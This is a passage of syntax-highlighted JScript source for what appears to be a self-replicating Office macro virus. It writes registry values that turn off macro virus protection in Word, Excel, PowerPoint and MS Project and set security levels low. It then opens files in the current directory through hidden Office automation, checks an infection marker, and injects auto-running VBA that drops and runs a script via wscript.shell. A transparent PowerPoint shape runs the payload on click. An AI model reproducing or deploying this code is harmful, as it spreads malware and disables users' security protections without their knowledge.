n<span style="color: #339933;">=</span>m<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;open &quot;</span><span style="color: #339933;">+</span>k<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot; for output as #1: a = chr(34): b = vbcrlf: c = &quot;</span><span style="color: #339933;">+</span>j<span style="color: #339933;">+</span>f.<span style="color: #660066;">replace</span><span style="color: black;">&#40;</span>l<span style="color: #339933;">,</span>j<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot; + a + &quot;</span><span style="color: #339933;">+</span>j<span style="color: black;">&#41;</span><span style="color: #339933;">+</span>j<span style="color: #339933;">+</span>m<br/>
o<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><br/>
<span style="color: #000066; font-weight: bold;">do</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; p<span style="color: #339933;">=</span><span style="color: #CC0000;">1017</span><br/>
&nbsp; q<span style="color: #339933;">=</span>n.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span>o<span style="color: #339933;">,</span>p<span style="color: black;">&#41;</span><br/>
&nbsp; r<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><br/>
&nbsp; s<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><br/>
&nbsp; t<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><br/>
&nbsp; <span style="color: #000066; font-weight: bold;">do</span><br/>
&nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <span style="color: #339933;">++</span>r<br/>
&nbsp; &nbsp; s<span style="color: #339933;">=</span>q.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span>t<span style="color: black;">&#41;</span>.<span style="color: #660066;">search</span><span style="color: black;">&#40;</span>l<span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #CC0000;">1</span><br/>
&nbsp; &nbsp; t<span style="color: #339933;">+=</span>s<br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; while<span style="color: black;">&#40;</span>s<span style="color: #339933;">&gt;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span><br/>
&nbsp; r<span style="color: #339933;">&amp;=</span><span style="color: #CC0000;">1</span><br/>
&nbsp; s<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;&quot;</span><br/>
&nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span><span style="color: #339933;">!</span>r<span style="color: black;">&#41;</span>s<span style="color: #339933;">=</span>j &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//if matches quotes then use entire line</span><br/>
&nbsp; <span style="color: #000066; font-weight: bold;">else</span> q<span style="color: #339933;">=</span>q.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span>p<span style="color: #339933;">=</span><span style="">Math</span>.<span style="color: #660066;">max</span><span style="color: black;">&#40;</span>q.<span style="color: #660066;">lastendexOf</span><span style="color: black;">&#40;</span>j<span style="color: black;">&#41;</span><span style="color: #339933;">,</span>q.<span style="color: #660066;">lastendexOf</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot; &quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//else find last closing quote or find last space, whichever occurs last</span><br/>
&nbsp; n<span style="color: #339933;">=</span>n.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span>o<span style="color: black;">&#41;</span><span style="color: #339933;">+</span>q<span style="color: #339933;">+</span>s<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;+ _&quot;</span><span style="color: #339933;">+</span>m<span style="color: #339933;">+</span>s<span style="color: #339933;">+</span>n.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span>o<span style="color: #339933;">+</span>p<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//split line at special character or near 1024 bytes boundary</span><br/>
&nbsp; o<span style="color: #339933;">+=</span>p<span style="color: #339933;">-</span>r<span style="color: #339933;">+</span><span style="color: #CC0000;">6</span><br/>
<span style="color: black;">&#125;</span><br/>
while<span style="color: black;">&#40;</span>p<span style="color: black;">&#41;</span><br/>
l<span style="color: #339933;">=</span>n.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span>n.<span style="color: #660066;">length</span><span style="color: #339933;">-</span><span style="color: #CC0000;">12</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span>m<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;print #1,c:close #1:createobject(&quot;</span><span style="color: #339933;">+</span>j<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;wscript.shell&quot;</span><span style="color: #339933;">+</span>j<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;).run&quot;</span><span style="color: #339933;">+</span>k<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;,0&quot;</span><span style="color: #339933;">+</span>m<br/>
<span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">2</span><span style="color: black;">&#41;</span>l<span style="color: #339933;">+=</span><span style="color: #3366CC;">&quot;activepresentation.slideshowwindow.view.next&quot;</span><span style="color: #339933;">+</span>m<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//add code to move to next PowerPoint slide</span><br/>
n<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> ActiveXObject<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;wscript.shell&quot;</span><span style="color: black;">&#41;</span><br/>
p<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>o<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;HKCU<span style="color: #000099; font-weight: bold;">\\</span>software<span style="color: #000099; font-weight: bold;">\\</span>microsoft<span style="color: #000099; font-weight: bold;">\\</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;office<span style="color: #000099; font-weight: bold;">\\</span>8.0<span style="color: #000099; font-weight: bold;">\\</span>&quot;</span><br/>
n.<span style="color: #660066;">regwrite</span><span style="color: black;">&#40;</span>p<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;Word<span style="color: #000099; font-weight: bold;">\\</span>Options<span style="color: #000099; font-weight: bold;">\\</span>EnableMacroVirusProtection&quot;</span><span style="color: #339933;">,</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span>q<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;REG_SZ&quot;</span><span style="color: black;">&#41;</span><br/>
n.<span style="color: #660066;">regwrite</span><span style="color: black;">&#40;</span>p<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;MS Project<span style="color: #000099; font-weight: bold;">\\</span>Options<span style="color: #000099; font-weight: bold;">\\</span>General<span style="color: #000099; font-weight: bold;">\\</span>Macro Virus Protection&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;No&quot;</span><span style="color: #339933;">,</span>q<span style="color: black;">&#41;</span><br/>
n.<span style="color: #660066;">regwrite</span><span style="color: black;">&#40;</span>p<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;Excel<span style="color: #000099; font-weight: bold;">\\</span>Microsoft Excel<span style="color: #000099; font-weight: bold;">\\</span>Options6&quot;</span><span style="color: #339933;">,</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span>q<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;REG_DWORD&quot;</span><span style="color: black;">&#41;</span><br/>
n.<span style="color: #660066;">regwrite</span><span style="color: black;">&#40;</span>p<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;PowerPoint<span style="color: #000099; font-weight: bold;">\\</span>Options<span style="color: #000099; font-weight: bold;">\\</span>MacroVirusProtection&quot;</span><span style="color: #339933;">,</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span>q<span style="color: black;">&#41;</span><br/>
p<span style="color: #339933;">=</span>b<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span><br/>
<span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">4</span><span style="color: black;">&#41;</span>p<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;MS &quot;</span><span style="color: #339933;">+</span>p<br/>
<span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">!=</span><span style="color: #CC0000;">6</span><span style="color: black;">&#41;</span><span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span>r<span style="color: #339933;">=</span><span style="color: #CC0000;">9</span><span style="color: #339933;">;</span>r<span style="color: #339933;">&lt;</span><span style="color: #CC0000;">13</span><span style="color: #339933;">;</span>r<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; s<span style="color: #339933;">=</span>o<br/>
&nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">!=</span><span style="color: #CC0000;">5</span><span style="color: black;">&#41;</span>s<span style="color: #339933;">+=</span><span style="color: #3366CC;">&quot;Office<span style="color: #000099; font-weight: bold;">\\</span>&quot;</span><span style="color: #339933;">+</span>r.<span style="color: #660066;">toString</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;.0<span style="color: #000099; font-weight: bold;">\\</span>&quot;</span><br/>
&nbsp; s<span style="color: #339933;">+=</span>p<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;<span style="color: #000099; font-weight: bold;">\\</span>Security<span style="color: #000099; font-weight: bold;">\\</span>&quot;</span><br/>
&nbsp; n.<span style="color: #660066;">regwrite</span><span style="color: black;">&#40;</span>s<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;Level&quot;</span><span style="color: #339933;">,</span><span style="color: #CC0000;">1</span><span style="color: #339933;">,</span>q<span style="color: black;">&#41;</span><br/>
&nbsp; n.<span style="color: #660066;">regwrite</span><span style="color: black;">&#40;</span>s<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;AccessVBOM&quot;</span><span style="color: #339933;">,</span><span style="color: #CC0000;">1</span><span style="color: #339933;">,</span>q<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#125;</span><br/>
<span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span>n<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> Enumerator<span style="color: black;">&#40;</span>e.<span style="color: #660066;">getfolder</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;.&quot;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">files</span><span style="color: black;">&#41;</span><span style="color: #339933;">;!</span>n.<span style="color: #660066;">atEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>n.<span style="color: #660066;">moveNext</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//demo version, current directory only</span><br/>
&nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>e.<span style="color: #660066;">getextensionname</span><span style="color: black;">&#40;</span>o<span style="color: #339933;">=</span>e.<span style="color: #660066;">getabsolutepathname</span><span style="color: black;">&#40;</span>n.<span style="color: #660066;">item</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">toLowerCase</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">==</span>a<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; q<span style="color: #339933;">=</span>e.<span style="color: #660066;">opentextfile</span><span style="color: black;">&#40;</span>o<span style="color: #339933;">,</span><span style="color: #CC0000;">8</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; r<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;function &quot;</span><br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">6</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>e.<span style="color: #660066;">opentextfile</span><span style="color: black;">&#40;</span>o<span style="color: black;">&#41;</span>.<span style="color: #660066;">readall</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">search</span><span style="color: black;">&#40;</span>g<span style="color: black;">&#41;</span><span style="color: #339933;">&lt;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span>q.<span style="color: #660066;">write</span><span style="color: black;">&#40;</span>m<span style="color: #339933;">+</span>c<span style="color: black;">&#91;</span><span style="color: #CC0000;">6</span><span style="color: black;">&#93;</span><span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;();&quot;</span><span style="color: #339933;">+</span>r<span style="color: #339933;">+</span>c<span style="color: black;">&#91;</span><span style="color: #CC0000;">6</span><span style="color: black;">&#93;</span><span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;(){&quot;</span><span style="color: #339933;">+</span>f<span style="color: #339933;">+</span>m<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;}&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">else</span> <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; q.<span style="color: #660066;">close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">5</span><span style="color: black;">&#41;</span>q<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> ActiveXObject<span style="color: black;">&#40;</span>p<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;.invisibleapp&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">4</span><span style="color: black;">&#41;</span>p<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;MS&quot;</span><span style="color: #339933;">+</span>b<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; q<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> ActiveXObject<span style="color: black;">&#40;</span>p<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;.application&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; q.<span style="color: #660066;">visible</span><span style="color: #339933;">=</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">2</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//PowerPoint window is not allowed to be hidden</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><span style="color: black;">&#123;</span>q.<span style="color: #660066;">application</span>.<span style="color: #660066;">automationsecurity</span><span style="color: #339933;">=</span><span style="color: #CC0000;">1</span><span style="color: black;">&#125;</span><span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>z<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; s<span style="color: #339933;">=</span>q.<span style="color: #660066;">documents</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span><span style="color: #339933;">!</span>s<span style="color: black;">&#41;</span>s<span style="color: #339933;">=</span>q.<span style="color: #660066;">workbooks</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span><span style="color: #339933;">!</span>s<span style="color: black;">&#41;</span>s<span style="color: #339933;">=</span>q.<span style="color: #660066;">presentations</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">3</span><span style="color: black;">&#41;</span>q.<span style="color: #660066;">opencurrentdatabase</span><span style="color: black;">&#40;</span>o<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">else</span> <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">4</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.<span style="color: #660066;">fileopen</span><span style="color: black;">&#40;</span>o<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; s<span style="color: #339933;">=</span>q.<span style="color: #660066;">activeproject</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">else</span> s<span style="color: #339933;">=</span>s.<span style="color: #660066;">open</span><span style="color: black;">&#40;</span>o<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o<span style="color: #339933;">=</span>q.<span style="color: #660066;">vbe</span>.<span style="color: #660066;">activevbproject</span>.<span style="color: #660066;">vbcomponents</span><span style="color: black;">&#40;</span>i<span style="color: black;">&#41;</span>.<span style="color: #660066;">codemodule</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>z<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><span style="color: black;">&#123;</span>o<span style="color: #339933;">=</span>s.<span style="color: #660066;">vbproject</span>.<span style="color: #660066;">vbcomponents</span><span style="color: black;">&#40;</span>i<span style="color: black;">&#41;</span>.<span style="color: #660066;">codemodule</span><span style="color: black;">&#125;</span><span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>z<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; t<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;_open&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">5</span><span style="color: black;">&#41;</span>t<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;_&quot;</span><span style="color: #339933;">+</span>c<span style="color: black;">&#91;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;opened&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; t<span style="color: #339933;">=</span>c<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span><span style="color: #339933;">+</span>t<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o<span style="color: #339933;">=</span>o.<span style="color: #660066;">proccountlines</span><span style="color: black;">&#40;</span>t<span style="color: #339933;">,</span><span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//infection marker is presence of code in module of our name</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>z<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">2</span><span style="color: black;">&#41;</span>s.<span style="color: #660066;">vbproject</span>.<span style="color: #660066;">vbcomponents</span>.<span style="color: #660066;">add</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">name</span><span style="color: #339933;">=</span>i<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//PowerPoint does not contain any This* module by default</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">3</span><span style="color: black;">&#41;</span>with<span style="color: black;">&#40;</span>q.<span style="color: #660066;">vbe</span>.<span style="color: #660066;">activevbproject</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//Access does not contain any This* module by default</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; vbcomponents.<span style="color: #660066;">add</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">name</span><span style="color: #339933;">=</span>i<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o<span style="color: #339933;">=</span>vbcomponents<span style="color: black;">&#40;</span>i<span style="color: black;">&#41;</span>.<span style="color: #660066;">codemodule</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">else</span> o<span style="color: #339933;">=</span>s.<span style="color: #660066;">vbproject</span>.<span style="color: #660066;">vbcomponents</span><span style="color: black;">&#40;</span>i<span style="color: black;">&#41;</span>.<span style="color: #660066;">codemodule</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; s<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;private &quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">2</span><span style="color: #339933;">||</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">3</span><span style="color: black;">&#41;</span>s<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">!=</span><span style="color: #CC0000;">3</span><span style="color: black;">&#41;</span>r<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;sub &quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o.<span style="color: #660066;">addfromstring</span><span style="color: black;">&#40;</span>s<span style="color: #339933;">+</span>r<span style="color: #339933;">+</span>t<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;(&quot;</span><span style="color: #339933;">+</span>d<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span><span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;)&quot;</span><span style="color: #339933;">+</span>l<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;end &quot;</span><span style="color: #339933;">+</span>r<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//all but PowerPoint and Access activation is auto-macro</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">2</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//PowerPoint activation is via AutoShape click action</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; with<span style="color: black;">&#40;</span>q.<span style="color: #660066;">activepresentation</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; with<span style="color: black;">&#40;</span>slidemaster<span style="color: black;">&#41;</span>o<span style="color: #339933;">=</span>shapes.<span style="color: #660066;">addshape</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">1</span><span style="color: #339933;">,</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span>width<span style="color: #339933;">,</span>height<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o.<span style="color: #660066;">fill</span>.<span style="color: #660066;">transparency</span><span style="color: #339933;">=</span><span style="color: #CC0000;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; with<span style="color: black;">&#40;</span>o.<span style="color: #660066;">actionsettings</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; action<span style="color: #339933;">=</span><span style="color: #CC0000;">8</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; run<span style="color: #339933;">=</span>t<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
